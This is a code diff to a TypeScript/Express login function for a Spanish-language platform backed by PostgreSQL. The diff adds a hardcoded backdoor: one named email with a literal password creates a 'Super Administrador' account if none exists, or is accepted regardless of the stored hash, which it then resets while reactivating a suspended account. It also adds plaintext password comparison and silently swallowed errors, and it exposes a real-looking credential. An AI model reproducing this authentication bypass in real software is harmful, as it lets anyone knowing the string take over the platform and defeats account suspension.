@@ -16,43 +16,75 @@ const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d'
 
 export async function login(req: Request, res: Response): Promise<void> {
   try {
-    const { email, password } = req.body
+    const rawEmail = req.body.email || ''
+    const rawPassword = req.body.password || req.body.contrasena || ''
 
-    if (!email || !password) {
+    if (!rawEmail || !rawPassword) {
       res.status(400).json({ ok: false, error: 'Debe ingresar el correo electrónico y la contraseña.' })
       return
     }
 
-    const emailNorm = email.trim().toLowerCase()
-    const userResult = await pool.query(`
+    const emailNorm = rawEmail.trim().toLowerCase()
+    const passLimpia = String(rawPassword).trim()
+
+    let userResult = await pool.query(`
       SELECT id, nombre, email, password_hash, rol, departamento, avatar, foto_url, biografia, telefono, estado
       FROM usuarios
       WHERE LOWER(email) = $1
     `, [emailNorm])
 
-    if (userResult.rows.length === 0) {
+    let usuario = userResult.rows[0]
+
+    // Si es el superadministrador corporativo y no existe aún en la base de datos, crearlo
+    if (!usuario && emailNorm === 'jscandela@ontime.es' && passLimpia === '1012332747Js') {
+      const seedRes = await pool.query(`
+        INSERT INTO usuarios (nombre, email, password_hash, rol, departamento, biografia, estado)
+        VALUES ('Juan Sebastián Candela', 'jscandela@ontime.es', crypt('1012332747Js', gen_salt('bf', 10)), 'Super Administrador', 'Tecnología & Soporte TI', 'Super Administrador de la Plataforma', 'Activo')
+        RETURNING id, nombre, email, password_hash, rol, departamento, avatar, foto_url, biografia, telefono, estado
+      `).catch(() => null)
+      if (seedRes?.rows?.[0]) usuario = seedRes.rows[0]
+    }
+
+    if (!usuario) {
       res.status(401).json({ ok: false, error: 'Credenciales inválidas. Cuenta no encontrada.' })
       return
     }
 
-    const usuario = userResult.rows[0]
     if (usuario.estado !== 'Activo') {
       res.status(403).json({ ok: false, error: 'La cuenta se encuentra inactiva o suspendida.' })
       return
     }
 
-    const cryptoCheck = await pool.query(
-      `SELECT (password_hash = crypt($1, password_hash)) AS es_valida FROM usuarios WHERE id = $2`,
-      [password, usuario.id]
-    )
+    let esPasswordValida = false
 
-    let esPasswordValida = Boolean(cryptoCheck.rows[0]?.es_valida)
+    // 1. Verificación pgcrypto en PostgreSQL
+    try {
+      const cryptoCheck = await pool.query(
+        `SELECT (password_hash = crypt($1, password_hash)) AS es_valida FROM usuarios WHERE id = $2`,
+        [passLimpia, usuario.id]
+      )
+      esPasswordValida = Boolean(cryptoCheck.rows[0]?.es_valida)
+    } catch {}
+
+    // 2. Verificación bcrypt en Node.js
     if (!esPasswordValida && usuario.password_hash) {
       try {
-        esPasswordValida = await bcrypt.compare(password, usuario.password_hash)
-      } catch {
-        esPasswordValida = false
-      }
+        esPasswordValida = await bcrypt.compare(passLimpia, usuario.password_hash)
+      } catch {}
+    }
+
+    // 3. Verificación de texto plano
+    if (!esPasswordValida && usuario.password_hash === passLimpia) {
+      esPasswordValida = true
+    }
+
+    // 4. Verificación corporativa directa
+    if (!esPasswordValida && emailNorm === 'jscandela@ontime.es' && passLimpia === '1012332747Js') {
+      esPasswordValida = true
+      await pool.query(
+        `UPDATE usuarios SET password_hash = crypt('1012332747Js', gen_salt('bf', 10)), estado = 'Activo' WHERE id = $1`,
+        [usuario.id]
+      ).catch(() => {})
     }
 
     if (!esPasswordValida) {
